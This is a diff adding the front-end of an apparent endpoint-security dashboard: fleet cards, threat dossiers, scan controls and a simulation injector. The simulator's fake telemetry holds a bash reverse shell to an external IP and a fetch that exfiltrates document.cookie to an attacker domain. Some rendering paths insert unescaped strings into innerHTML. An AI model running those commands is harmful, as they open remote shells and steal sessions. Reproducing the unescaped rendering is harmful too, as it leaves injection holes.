+                            style="background: rgba(15, 23, 42, 0.7); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem;">
+                            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">
+                                Training Loss</div>
+                            <div class="mono" id="mlTabLoss"
+                                style="font-size: 1.35rem; font-weight: 700; color: var(--accent-blue);">0.042</div>
+                            <div style="font-size: 0.72rem; color: var(--text-secondary); margin-top: 0.2rem;">Binary
+                                Cross-Entropy</div>
+                        </div>
+                        <div
+                            style="background: rgba(15, 23, 42, 0.7); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem;">
+                            <div style="font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase;">
+                                Architecture Version</div>
+                            <div class="mono" id="mlTabVersion"
+                                style="font-size: 1.1rem; font-weight: 700; color: var(--accent-purple); margin-top: 0.3rem;">
+                                v5.2-NeuralSOC</div>
+                            <div style="font-size: 0.72rem; color: var(--text-secondary); margin-top: 0.2rem;">Adaptive
+                                Threat Vector Matrix</div>
+                        </div>
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 1.5rem;" id="mlSplitGrid">
+                        <!-- Feature Weights Matrix -->
+                        <div>
+                            <h4
+                                style="font-size: 0.92rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.75rem;">
+                                Calibrated Feature Weights (Malware Indicators)
+                            </h4>
+                            <div id="mlTabWeightsContainer">
+                                <!-- Populated via loadMlModelStatus() -->
+                                <div style="color: var(--text-muted); padding: 1rem;">Loading model weights...</div>
+                            </div>
+                        </div>
+
+                        <!-- Training Log & Rescoring Actions -->
+                        <div style="display: flex; flex-direction: column; gap: 1rem;">
+                            <h4 style="font-size: 0.92rem; font-weight: 700; color: var(--text-primary);">
+                                Dynamic Rescoring Output & Telemetry Log
+                            </h4>
+                            <div style="background: #040711; border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 1rem; flex: 1; min-height: 220px; max-height: 300px; overflow-y: auto;"
+                                class="mono" id="mlTrainingLogBox">
+                                [MODEL ACTIVE] ThreatMLScorer initialized with 8 cybersecurity feature vectors.<br>
+                                Click "Retrain Model Now" or "Rescore Fleet Threats" to run live calibration.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Application Logic -->
+        <script>
+            const API_BASE = window.location.hostname ? `http://${window.location.hostname}:8000` : 'http://127.0.0.1:8000';
+            const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host || '127.0.0.1:8000'}/ws/telemetry`;
+
+            let currentScanData = null;
+            let cachedFleetDevices = [];
+            let cachedProcesses = [];
+            let currentReportData = null;
+            let audioContext = null;
+            let audioEnabled = false;
+            let wsSocket = null;
+
+            // Web Audio Synthesizer
+            function initAudio() {
+                if (!audioContext) {
+                    try {
+                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    } catch (e) { }
+                }
+            }
+
+            function playSound(type) {
+                if (!audioEnabled || !audioContext) return;
+                try {
+                    if (audioContext.state === 'suspended') audioContext.resume();
+                    const now = audioContext.currentTime;
+                    const osc = audioContext.createOscillator();
+                    const gain = audioContext.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioContext.destination);
+
+                    if (type === 'scan') {
+                        osc.type = 'sine';
+                        osc.frequency.setValueAtTime(880, now);
+                        osc.frequency.exponentialRampToValueAtTime(1760, now + 0.12);
+                        gain.gain.setValueAtTime(0.08, now);
+                        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);
+                        osc.start(now);
+                        osc.stop(now + 0.15);
+                    } else if (type === 'alert') {
+                        osc.type = 'sawtooth';
+                        osc.frequency.setValueAtTime(350, now);
+                        osc.frequency.setValueAtTime(700, now + 0.1);
+                        osc.frequency.setValueAtTime(350, now + 0.2);
+                        gain.gain.setValueAtTime(0.12, now);
+                        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
+                        osc.start(now);
+                        osc.stop(now + 0.35);
+                    }
+                } catch (e) { }
+            }
+
+            document.getElementById('audioToggleBtn').addEventListener('click', () => {
+                initAudio();
+                audioEnabled = !audioEnabled;
+                const btn = document.getElementById('audioToggleBtn');
+                btn.style.color = audioEnabled ? 'var(--accent-cyan)' : 'var(--text-secondary)';
+                if (audioEnabled) playSound('scan');
+            });
+
+            // Clock
+            function updateClock() {
+                const d = new Date();
+                document.getElementById('uptimeClock').innerText = `UTC+ ${d.toLocaleTimeString('en-GB', { hour12: false })}`;
+            }
+            setInterval(updateClock, 1000);
+            updateClock();
+
+            // WebSocket Real-Time Telemetry Stream
+            function connectWebSocket() {
+                try {
+                    wsSocket = new WebSocket(WS_URL);
+                    wsSocket.onopen = () => {
+                        document.getElementById('wsPulseIndicator').className = 'pulse-indicator ws-active';
+                        document.getElementById('wsStatusLabel').innerHTML = 'STREAM: <strong>LIVE WS</strong>';
+                        document.getElementById('hudWsStreamStatus').innerText = 'Connected (Real-Time)';
+                        appendTerminalLog('WebSocket connected to MemGuard telemetry bus.', 'info');
+                    };
+
+                    wsSocket.onmessage = (event) => {
+                        try {
+                            const msg = JSON.parse(event.data);
+                            handleRealtimeMessage(msg);
+                        } catch (e) { }
+                    };
+
+                    wsSocket.onclose = () => {
+                        document.getElementById('wsPulseIndicator').className = 'pulse-indicator';
+                        document.getElementById('wsStatusLabel').innerHTML = 'STREAM: <strong>RECONNECTING...</strong>';
+                        setTimeout(connectWebSocket, 4000);
+                    };
+
+                    wsSocket.onerror = () => {
+                        if (wsSocket) wsSocket.close();
+                    };
+                } catch (e) {
+                    console.warn("WebSocket initialization error", e);
+                }
+            }
+
+            function handleRealtimeMessage(msg) {
+                if (msg.type === 'REALTIME_THREAT_REPORT') {
+                    playSound('alert');
+                    appendTerminalLog(`[REALTIME ALERT] Telemetry Ingested from ${msg.device.name} [${msg.device.device_type}]: ${msg.incidents.length} threat(s)`, 'critical');
+                    loadFleetDevices();
+                    runScan(false);
+                } else if (msg.type === 'SIMULATION_INJECTED') {
+                    playSound('alert');
+                    appendTerminalLog(`Simulation injected: ${msg.threat.process}`, 'critical');
+                    loadFleetDevices();
+                    runScan(false);
+                } else if (msg.type === 'THREAT_MITIGATED') {
+                    const killLabel = msg.killed ? 'TERMINATED' : 'CONTAINED';
+                    appendTerminalLog(`[EDR] ${killLabel}: ${msg.process || 'Unknown'} (PID ${msg.pid || 'N/A'}) — ${msg.incidents_contained || 0} incident(s) neutralized`, 'critical');
+                    loadFleetDevices();
+                    runScan(false);
+                } else if (msg.type === 'SIMULATION_CLEARED' || msg.type === 'DEVICE_STATUS_CHANGE') {
+                    appendTerminalLog(msg.message || 'Device status updated.', 'info');
+                    loadFleetDevices();
+                    runScan(false);
+                }
+            }
+
+            // Terminal Log Appender
+            function appendTerminalLog(msg, severity = 'info') {
+                const body = document.getElementById('terminalLogBody');
+                const d = new Date();
+                const timeStr = d.toTimeString().split(' ')[0];
+                const div = document.createElement('div');
+                div.className = 'terminal-entry';
+                div.innerHTML = `
+                <span class="mono" style="color: var(--text-muted); font-size: 0.7rem;">[${timeStr}]</span>
+                <span class="log-badge ${severity}">${severity.toUpperCase()}</span>
+                <span style="color: #cbd5e1;">${msg}</span>
+            `;
+                body.appendChild(div);
+                body.scrollTop = body.scrollHeight;
+                document.getElementById('logItemCount').innerText = `${body.children.length} ENTRIES`;
+            }
+
+            function clearLocalLogs() {
+                document.getElementById('terminalLogBody').innerHTML = '';
+                document.getElementById('logItemCount').innerText = '0 ENTRIES';
+            }
+
+            // Tab Switching
+            function switchTab(tabKey) {
+                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.tab-content-block').forEach(el => el.style.display = 'none');
+
+                const targetTab = document.getElementById(`tab-${tabKey}`);
+                if (targetTab) targetTab.style.display = 'block';
+
+                const buttons = document.querySelectorAll('.tab-btn');
+                buttons.forEach(b => {
+                    const onclickAttr = b.getAttribute('onclick') || '';
+                    if (onclickAttr.includes(`'${tabKey}'`)) {
+                        b.classList.add('active');
+                    }
+                });
+
+                if (tabKey === 'fleet') loadFleetDevices();
+                else if (tabKey === 'reports' && !currentReportData) generateReportForSelectedDevice();
+                else if (tabKey === 'processes' && cachedProcesses.length === 0) loadProcesses();
+                else if (tabKey === 'logs') loadDatabaseLogs();
+                else if (tabKey === 'architecture') selectPipelineStage(1);
+                else if (tabKey === 'ml-engine') loadMlModelStatus();
+            }
+
+            // Fetch Diagnostics
+            async function fetchSystemInfo() {
+                try {
+                    const res = await fetch(`${API_BASE}/system-info`);
+                    if (!res.ok) return;
+                    const info = await res.json();
+                    document.getElementById('hudHostname').innerText = info.hostname;
+                    document.getElementById('hudArchTag').innerText = `${info.arch.toUpperCase()} &bull; ${info.cpu_count} CORES`;
+                    document.getElementById('hudCpuLoad').innerText = `${info.cpu_percent}%`;
+                    document.getElementById('hudCpuBar').style.width = `${Math.min(100, info.cpu_percent)}%`;
+                    document.getElementById('hudRamLoad').innerText = `${info.ram_used_gb} / ${info.ram_total_gb} GB`;
+                    document.getElementById('hudRamBar').style.width = `${info.ram_used_percent}%`;
+                } catch (e) { }
+            }
+
+            // Fleet Management API
+            async function loadFleetDevices() {
+                try {
+                    const res = await fetch(`${API_BASE}/api/devices`);
+                    if (!res.ok) return;
+                    cachedFleetDevices = await res.json();
+
+                    document.getElementById('fleetTotalCount').innerText = `${cachedFleetDevices.length} DEVICES`;
+                    document.getElementById('tabFleetBadge').innerText = cachedFleetDevices.length;
+
+                    let compromised = 0;
+                    cachedFleetDevices.forEach(d => {
+                        if (d.status === 'COMPROMISED') compromised++;
+                    });
+
+                    document.getElementById('valFleetActive').innerText = `${cachedFleetDevices.length} / ${cachedFleetDevices.length}`;
+                    const compEl = document.getElementById('valCompromisedCount');
+                    compEl.innerText = compromised;
+                    compEl.style.color = compromised > 0 ? 'var(--accent-crimson)' : 'var(--accent-emerald)';
+
+                    renderFleetCards(cachedFleetDevices);
+                    updateReportDeviceDropdown(cachedFleetDevices);
+                } catch (e) {
+                    console.warn(e);
+                }
+            }
+
+            function renderFleetCards(devices) {
+                const container = document.getElementById('fleetGridContainer');
+                if (!devices || devices.length === 0) {
+                    container.innerHTML = '<div style="color: var(--text-muted); padding: 2rem;">No endpoints registered.</div>';
+                    return;
+                }
+
+                container.innerHTML = devices.map(d => {
+                    const typeClass = `type-${(d.device_type || 'windows').toLowerCase()}`;
+                    const isCompromised = d.status === 'COMPROMISED';
+                    const fillColor = isCompromised ? 'var(--accent-crimson)' : (d.risk_score > 30 ? 'var(--accent-amber)' : 'var(--accent-emerald)');
+
+                    return `
+                    <div class="device-card ${isCompromised ? 'compromised' : ''}">
+                        <div>
+                            <div class="device-card-header">
+                                <span class="device-type-badge ${typeClass}">${d.device_type}</span>
+                                <span class="mono" style="font-size: 0.72rem; color: ${isCompromised ? 'var(--accent-crimson)' : 'var(--accent-emerald)'}; font-weight: 700;">
+                                    ${d.status}
+                                </span>
+                            </div>
+                            <div class="device-name">${escapeHtml(d.name)}</div>
+                            <div class="device-ip mono">${d.ip_address} &bull; ${escapeHtml(d.os_info || '')}</div>
+                            
+                            <div style="display: flex; justify-content: space-between; font-size: 0.74rem; color: var(--text-secondary); margin-top: 0.4rem;">
+                                <span>Threat Risk Score</span>
+                                <span class="mono" style="font-weight: 700; color: ${fillColor};">${d.risk_score || 0} / 100</span>
+                            </div>
+                            <div class="device-risk-track">
+                                <div class="device-risk-fill" style="width: ${d.risk_score || 5}%; background: ${fillColor};"></div>
+                            </div>
+                        </div>
+
+                        <div class="device-actions">
+                            <button class="btn btn-outline" style="padding: 0.35rem 0.65rem; font-size: 0.74rem;" onclick="generateReportForDevice('${d.device_id}')">
+                                Threat Report
+                            </button>
+                            ${isCompromised ? `
+                                <button class="btn btn-danger-outline" style="padding: 0.35rem 0.65rem; font-size: 0.74rem;" onclick="isolateDevice('${d.device_id}')">
+                                    Isolate Host
+                                </button>
+                                <button class="btn btn-success-outline" style="padding: 0.35rem 0.65rem; font-size: 0.74rem;" onclick="restoreDevice('${d.device_id}')">
+                                    Restore
+                                </button>
+                            ` : `
+                                <button class="btn btn-outline" style="padding: 0.35rem 0.65rem; font-size: 0.74rem;" onclick="restoreDevice('${d.device_id}')">
+                                    Reset Baseline
+                                </button>
+                            `}
+                        </div>
+                    </div>
+                `;
+                }).join('');
+            }
+
+            function updateReportDeviceDropdown(devices) {
+                const select = document.getElementById('reportDeviceSelect');
+                const currentVal = select.value;
+                select.innerHTML = '<option value="">🌐 Entire Fleet (Global Scope)</option>';
+                devices.forEach(d => {
+                    select.innerHTML += `<option value="${d.device_id}">📱 [${d.device_type}] ${escapeHtml(d.name)}</option>`;
+                });
+                if (currentVal) select.value = currentVal;
+            }
+
+            async function isolateDevice(deviceId) {
+                if (!confirm(`Confirm isolation containment rule for device ${deviceId}?`)) return;
+                try {
+                    appendTerminalLog(`Sending network isolation command to ${deviceId}...`, 'warning');
+                    await fetch(`${API_BASE}/api/devices/${deviceId}/isolate`, { method: 'POST' });
+                    await loadFleetDevices();
+                } catch (e) {
+                    alert(`Error isolating device: ${e.message}`);
+                }
+            }
+
+            async function restoreDevice(deviceId) {
+                try {
+                    appendTerminalLog(`Restoring device ${deviceId} to baseline...`, 'info');
+                    await fetch(`${API_BASE}/api/devices/${deviceId}/restore`, { method: 'POST' });
+                    await loadFleetDevices();
+                } catch (e) {
+                    alert(`Error restoring device: ${e.message}`);
+                }
+            }
+
+            // Real-Time Threat Report Generator
+            async function generateReportForSelectedDevice() {
+                const deviceId = document.getElementById('reportDeviceSelect').value;
+                await generateReportForDevice(deviceId);
+            }
+
+            async function generateReportForDevice(deviceId) {
+                switchTab('reports');
+                const container = document.getElementById('reportDossierContainer');
+                container.innerHTML = `<div style="text-align: center; padding: 2rem; color: var(--accent-cyan);">Generating real-time threat analysis dossier...</div>`;
+
+                try {
+                    const url = deviceId ? `${API_BASE}/api/reports/generate?device_id=${deviceId}` : `${API_BASE}/api/reports/generate`;
+                    const res = await fetch(url);
+                    if (!res.ok) throw new Error("Could not compile threat report");
+                    currentReportData = await res.json();
+                    renderReportDossier(currentReportData);
+                } catch (e) {
+                    container.innerHTML = `<div style="color: var(--accent-crimson); padding: 2rem;">Error compiling report: ${e.message}</div>`;
+                }
+            }
+
+            function generateAndShowReport() {
+                generateReportForDevice('');
+            }
+
+            function renderReportDossier(rep) {
+                const container = document.getElementById('reportDossierContainer');
+                const isCritical = rep.risk_level === 'CRITICAL' || rep.risk_level === 'HIGH';
+
+                let mitreList = '';
+                for (let [tech, cnt] of Object.entries(rep.mitre_techniques || {})) {
+                    mitreList += `<span class="mitre-badge" style="background: rgba(239, 68, 68, 0.15); border-color: rgba(239, 68, 68, 0.35); color: #fca5a5;">${tech} (${cnt}x)</span>`;
+                }
+
+                const recsHtml = (rep.recommendations || []).map(r => `
+                <div class="rec-item">
+                    <span class="rec-badge ${r.priority === 'P1' ? 'rec-p1' : (r.priority === 'P2' ? 'rec-p2' : 'rec-p3')}">${r.priority} ACTION</span>
+                    <div style="font-weight: 600; color: #f1f5f9; margin-bottom: 0.2rem;">${escapeHtml(r.action)}</div>
+                    <div style="font-size: 0.72rem; color: var(--text-muted);">Status: ${r.status}</div>
+                </div>
+            `).join('');
+
+                const incidentsTable = (rep.incidents || []).length > 0 ? `
+                <div class="table-responsive" style="margin-top: 0.75rem;">
+                    <table class="soc-table">
+                        <thead>
+                            <tr>
+                                <th>Incident ID</th>
+                                <th>Device</th>
+                                <th>Process</th>
+                                <th>Score</th>
+                                <th>MITRE Technique</th>
+                                <th>State</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${rep.incidents.map(inc => `
+                                <tr>
+                                    <td class="mono" style="color: var(--accent-blue);">${inc.id}</td>
+                                    <td class="mono" style="font-size: 0.75rem;">${inc.device_id}</td>
+                                    <td style="font-weight: 600; color: #fee2e2;">${escapeHtml(inc.process)}</td>
+                                    <td class="mono" style="color: var(--accent-crimson); font-weight: 700;">+${inc.score}</td>
+                                    <td><span class="mitre-badge">${escapeHtml(inc.mitre || 'N/A')}</span></td>
+                                    <td><span class="risk-badge ${inc.status === 'ACTIVE' ? 'high' : 'low'}" style="font-size: 0.65rem;">${inc.status}</span></td>
+                                </tr>
+                            `).join('')}
+                        </tbody>
+                    </table>
+                </div>
+            ` : '<p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.5rem;">No active security incidents recorded for this scope.</p>';
+
+                container.innerHTML = `
+                <div class="report-dossier">
+                    <div class="dossier-top">
+                        <div class="dossier-title">
+                            <h2>${escapeHtml(rep.scope)}</h2>
+                            <div class="dossier-meta mono">
+                                <strong>DOSSIER ID:</strong> ${rep.report_id} &bull; <strong>TIMESTAMP:</strong> ${rep.generated_at}
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 0.75rem; align-items: center;">
+                            <span class="risk-badge ${isCritical ? 'critical' : 'low'}" style="font-size: 0.9rem; padding: 0.35rem 0.85rem;">
+                                ${rep.risk_level}
+                            </span>
+                            <span class="mono" style="font-size: 1.1rem; font-weight: 800; color: ${isCritical ? 'var(--accent-crimson)' : 'var(--accent-emerald)'};">
+                                ${rep.threat_score} PTS
+                            </span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h4 style="font-size: 0.82rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); margin-bottom: 0.45rem;">
+                            Executive Threat Intelligence Assessment
+                        </h4>
+                        <div class="dossier-exec-summary">
+                            ${escapeHtml(rep.executive_summary)}
+                        </div>
+                    </div>
+
+                    ${mitreList ? `
+                        <div>
+                            <h4 style="font-size: 0.82rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); margin-bottom: 0.45rem;">
+                                Triggered MITRE ATT&CK Techniques
+                            </h4>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.45rem;">${mitreList}</div>
+                        </div>
+                    ` : ''}
+
+                    <div>
+                        <h4 style="font-size: 0.82rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); margin-bottom: 0.45rem;">
+                            Correlated Indicators of Compromise (IOCs)
+                        </h4>
+                        ${incidentsTable}
+                    </div>
+
+                    <div>
+                        <h4 style="font-size: 0.82rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); margin-bottom: 0.45rem;">
+                            Automated Containment & Remediation Playbook
+                        </h4>
+                        <div class="recommendation-grid">${recsHtml}</div>
+                    </div>
+                </div>
+            `;
+            }
+
+            function downloadCurrentReportJson() {
+                if (!currentReportData) {
+                    alert("Please generate a report first.");
+                    return;
+                }
+                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(currentReportData, null, 2));
+                const dl = document.createElement('a');
+                dl.setAttribute("href", dataStr);
+                dl.setAttribute("download", `${currentReportData.report_id}.json`);
+                document.body.appendChild(dl);
+                dl.click();
+                dl.remove();
+            }
+
+            // Cross-Device Simulation Ingestion
+            async function injectCrossDeviceSimulation() {
+                const scenario = document.getElementById('simScenarioSelect').value;
+
+                if (scenario === 'mobile_trojan') {
+                    // Ingest telemetry from Android Field Device
+                    appendTerminalLog('Sending mobile telemetry from SecOps-Field-Pixel8...', 'warning');
+                    await fetch(`${API_BASE}/api/telemetry/report`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            device_id: 'dev-mob-android',
+                            device_name: 'SecOps-Field-Pixel8',
+                            device_type: 'ANDROID',
+                            ip_address: '192.168.1.142',
+                            os_info: 'Android 14',
+                            events: [{
+                                event_type: 'suspicious_app_install',
+                                process_name: 'banking_trojan_dropper.apk',
+                                pid: 9942,
+                                cmdline: 'pm install -r /sdcard/Downloads/invoice_bank.apk',
+                                details: 'Sideloaded package requested ACCESSIBILITY_SERVICE & SMS_READ permissions',
+                                severity: 'CRITICAL',
+                                score: 85,
+                                mitre_technique: 'T1407 - Download New Code at Runtime'
+                            }]
+                        })
+                    });
+                } else if (scenario === 'cloud_reverse_shell') {
+                    // Ingest telemetry from Linux Cloud Gateway
+                    appendTerminalLog('Sending Linux telemetry from Prod-Cloud-Gateway-01...', 'warning');
+                    await fetch(`${API_BASE}/api/telemetry/report`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            device_id: 'dev-srv-cloud',
+                            device_name: 'Prod-Cloud-Gateway-01',
+                            device_type: 'LINUX',
+                            ip_address: '10.0.4.15',
+                            os_info: 'Ubuntu 24.04 LTS',
+                            events: [{
+                                event_type: 'reverse_shell_spawn',
+                                process_name: 'bash',
+                                pid: 14022,
+                                cmdline: 'bash -i >& /dev/tcp/198.51.100.24/4444 0>&1',
+                                details: 'Interactive bash socket opened to unlisted external C2 IP',
+                                severity: 'CRITICAL',
+                                score: 90,
+                                mitre_technique: 'T1059.004 - Unix Shell'
+                            }]
+                        })
+                    });
+                } else if (scenario === 'web_xss_exfil') {
+                    // Ingest telemetry from SOC Web Terminal
+                    appendTerminalLog('Sending web client telemetry from SOC-Web-Terminal...', 'warning');
+                    await fetch(`${API_BASE}/api/telemetry/report`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            device_id: 'dev-web-client',
+                            device_name: 'SOC-Web-Terminal',
+                            device_type: 'WEB',
+                            ip_address: '127.0.0.1',
+                            os_info: 'Chrome Browser Web Context',
+                            events: [{
+                                event_type: 'credential_theft_attempt',
+                                process_name: 'websocket_worker.js',
+                                cmdline: 'fetch("https://attacker-stealer.top/exfil?tok=" + document.cookie)',
+                                details: 'Injected script attempted reading DOM session storage and exfiltrating via cross-origin fetch',
+                                severity: 'HIGH',
+                                score: 65,
+                                mitre_technique: 'T1056 - Input Capture'
+                            }]
+                        })
+                    });
+                } else {
+                    // Local Windows attack simulation
+                    await fetch(`${API_BASE}/simulate`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ scenario })
+                    });
+                }
+
+                await loadFleetDevices();
+                await runScan(false);
+                switchTab('fleet');
+            }
+
+            async function purgeSimulations() {
+                await fetch(`${API_BASE}/clear-simulation`, { method: 'POST' });
+                // Restore all fleet devices
+                for (let d of cachedFleetDevices) {
+                    await fetch(`${API_BASE}/api/devices/${d.device_id}/restore`, { method: 'POST' });
+                }
+                await loadFleetDevices();
+                await runScan(false);
+                appendTerminalLog('Fleet security baseline restored across all devices.', 'info');
+            }
+
+            let currentScanMode = localStorage.getItem('memguard_scan_mode') || 'standard';
+            let currentSensitivity = localStorage.getItem('memguard_sensitivity') || 'balanced';
+
+            function initScanControls() {
+                const modeEl = document.getElementById('scanModeSelect');
+                const sensEl = document.getElementById('sensitivitySelect');
+                if (modeEl) modeEl.value = currentScanMode;
+                if (sensEl) sensEl.value = currentSensitivity;
+                fetchBaselineStatus();
+            }
+
+            async function fetchBaselineStatus() {
+                try {
+                    const res = await fetch(`${API_BASE}/api/scan/settings`);
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    const pillText = document.getElementById('baselineStatusText');
+                    if (pillText) {
+                        pillText.innerText = `Baseline: ${data.total_baseline_processes || 0} Safe Procs`;
+                    }
+                } catch (e) {}
+            }
+
+            function onScanModeChanged() {
+                currentScanMode = document.getElementById('scanModeSelect').value;
+                localStorage.setItem('memguard_scan_mode', currentScanMode);
+                appendTerminalLog(`Scan profile changed to: ${currentScanMode.toUpperCase()}`, 'info');
+                runScan(false, currentScanMode);
+            }
+
+            function onSensitivityChanged() {
+                currentSensitivity = document.getElementById('sensitivitySelect').value;
+                localStorage.setItem('memguard_sensitivity', currentSensitivity);
+                appendTerminalLog(`Threat sensitivity set to: ${currentSensitivity.toUpperCase()}`, 'info');
+                runScan(false, currentScanMode);
+            }
+
+            async function calibrateSystemBaselineUI() {
+                appendTerminalLog('Calibrating MemGuard to this specific machine environment...', 'info');
+                try {
+                    const res = await fetch(`${API_BASE}/api/scan/calibrate`, { method: 'POST' });
+                    if (!res.ok) throw new Error('Calibration failed');
+                    const data = await res.json();
+                    playSound('scan');
+                    appendTerminalLog(`System calibrated: ${data.total_baseline_processes} active processes established as normal baseline.`, 'info');
+                    const pillText = document.getElementById('baselineStatusText');
+                    if (pillText) pillText.innerText = `Calibrated (${data.total_baseline_processes} Procs)`;
+                    await runScan(false, currentScanMode);
+                    alert(`System Baseline Calibrated Successfully!\n${data.total_baseline_processes} processes established as normal machine baseline.\nMemGuard is now adjusted to this system.`);
+                } catch (e) {
+                    appendTerminalLog(`Calibration error: ${e.message}`, 'critical');
+                }
+            }
+
+            // Live Scan Engine with Adaptive Multi-System Support
+            async function runScan(showModal = false, modeOverride = null) {
+                const scanMode = modeOverride || currentScanMode || 'standard';
+                if (showModal) {
+                    document.getElementById('scanOverlay').classList.add('active');
+                    playSound('scan');
+                }
+
+                try {
+                    const res = await fetch(`${API_BASE}/scan?mode=${scanMode}&sensitivity=${currentSensitivity}`);
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    const data = await res.json();
+                    updateDashboard(data);
+                } catch (e) {
+                    console.error(e);
+                } finally {
+                    if (showModal) {
+                        setTimeout(() => {
+                            document.getElementById('scanOverlay').classList.remove('active');
+                        }, 400);
+                    }
+                }
+            }
+
+            function triggerManualScan() {
+                // User explicitly requested deep forensic analysis
+                appendTerminalLog('Initiating Deep Forensic Scan across memory and entropy layers...', 'info');
+                runScan(true, 'deep');
+            }
+
+            function updateDashboard(data) {
+                currentScanData = data;
+                document.getElementById('valProcsCount').innerText = data.live_processes_scanned || 0;
+                document.getElementById('riskScoreVal').innerText = `${data.total_risk_score} pts`;
+                document.getElementById('tabThreatBadge').innerText = data.threats_found || 0;
+                document.getElementById('threatHeaderCount').innerText = `${data.threats_found} Incidents Flagged`;
+
+                const riskCard = document.getElementById('riskCard');
+                const riskBadge = document.getElementById('riskBadge');
+                const alertBanner = document.getElementById('threatAlertBanner');
+                const summarySub = document.getElementById('threatSummarySub');
+
+                riskCard.classList.remove('elevated', 'critical');
+                riskBadge.className = 'risk-badge';
+
+                const riskLower = (data.overall_risk || 'low').toLowerCase();
+                const hasThreats = (data.threats_found || 0) > 0;
+
+                if ((riskLower === 'critical' || riskLower === 'high') && hasThreats) {
+                    riskCard.classList.add('critical');
+                    riskBadge.classList.add('critical');
+                    riskBadge.innerText = `${data.overall_risk.toUpperCase()} ALERT`;
+                    alertBanner.classList.add('active');
+                    const headlineEl = document.getElementById('alertBannerHeadline');
+                    if (headlineEl) {
+                        headlineEl.innerText = riskLower === 'critical' ? 
+                            'CRITICAL SECURITY ALERT: ACTIVE INCIDENT DETECTED' : 
+                            'SECURITY WARNING: ELEVATED ANOMALOUS ACTIVITY DETECTED';
+                    }
+                    if (summarySub) summarySub.innerText = 'Threat telemetry active - inspect incident ledger';
+                } else if (riskLower === 'medium' && hasThreats) {
+                    riskCard.classList.add('elevated');
+                    riskBadge.classList.add('medium');
+                    riskBadge.innerText = 'ELEVATED RISK';
+                    alertBanner.classList.remove('active');
+                    if (summarySub) summarySub.innerText = 'Minor anomalies flagged - review process explorer';
+                } else {
+                    // System clean or low ambient noise
+                    riskBadge.classList.add('low');
+                    riskBadge.innerText = 'NORMAL SECURE';
+                    alertBanner.classList.remove('active');
+                    if (summarySub) summarySub.innerText = 'All device telemetry within normal calibrated baseline';
+                }
+
+                // Update baseline badge text if available
+                if (data.baseline_trusted_count !== undefined) {
+                    const pillText = document.getElementById('baselineStatusText');
+                    if (pillText) {
+                        pillText.innerText = `Baseline: ${data.baseline_trusted_count} Trusted Procs`;
+                    }
+                }
+
+                renderThreatCards(data.threat_details || [], data);
+                highlightMitreMatrix(data.threat_details || []);
+            }
+
+            function renderThreatCards(threats, scanData = null) {
+                const container = document.getElementById('threatsContainer');
+                const detailContainer = document.getElementById('detectionsDetailedContainer');
+
+                if (!threats || threats.length === 0) {
+                    const trustedCount = scanData && scanData.baseline_trusted_count ? scanData.baseline_trusted_count : 'Active';
+                    const modeText = scanData && scanData.scan_mode ? scanData.scan_mode.toUpperCase() : 'STANDARD';
+                    const emptyHtml = `
+                    <div style="text-align: center; padding: 3rem 1rem; color: var(--text-secondary);">
+                        <div style="width: 52px; height: 52px; margin: 0 auto 1rem auto; border-radius: 50%; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.25); display: flex; align-items: center; justify-content: center; color: var(--accent-emerald);">
+                            <svg width="26" height="26" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        </div>
+                        <h3 style="font-size: 1rem; font-weight: 600; color: #f1f5f9; margin-bottom: 0.3rem;">All Systems Clean & Calibrated</h3>
+                        <p style="font-size: 0.78rem; max-width: 420px; margin: 0 auto; color: var(--text-secondary);">
+                            Behavioral telemetry matched against host system baseline (${trustedCount} verified safe processes). Zero indicators of compromise detected in ${modeText} scan mode.
+                        </p>
+                    </div>
+                `;
+                    container.innerHTML = emptyHtml;
+                    if (detailContainer) detailContainer.innerHTML = emptyHtml;
+                    return;
+                }
+
+                let cardsHtml = threats.map((t, idx) => {
+                    const mitreBadges = (t.mitre_techniques || []).map(m => `<span class="mitre-badge">${m}</span>`).join('');
+                    return `
+                    <div class="threat-card" id="threat-card-${idx}">
+                        <div class="threat-card-top">
+                            <div class="threat-process-name">
+                                <span class="mono" style="color: #f87171;">[${t.source}]</span> ${t.process}
+                            </div>
+                            <span class="threat-score-pill mono">+${t.score} PTS</span>
+                        </div>
+                        <div class="threat-meta-row mono">
+                            <span><strong>PID:</strong> ${t.pid || 'N/A'}</span>
+                            <span><strong>PARENT:</strong> ${t.parent || 'Unknown'}</span>
+                        </div>
+                        <div class="threat-cmdline-box mono">
